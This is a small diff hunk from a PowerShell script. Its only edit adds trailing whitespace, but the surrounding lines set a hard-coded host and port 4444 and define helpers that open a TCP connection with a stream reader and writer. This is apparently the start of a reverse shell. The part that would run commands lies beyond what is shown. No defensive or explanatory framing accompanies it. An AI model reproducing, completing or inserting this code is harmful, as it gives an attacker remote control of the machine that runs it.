@@ -1,7 +1,7 @@
 $server = "192.168.1.23"; $port = 4444;
 function Create-Connection { param($target, $portnum) New-Object Net.Sockets.TcpClient($target, $portnum) }
 function Get-NetworkStream { param($client) $client.GetStream() }
-function Create-StreamReader { param($stream) New-Object IO.StreamReader($stream) }
+function Create-StreamReader { param($stream) New-Object IO.StreamReader($stream) } 
 function Create-StreamWriter { param($stream) New-Object IO.StreamWriter($stream) }
 
 $tcpClient = Create-Connection $server $port
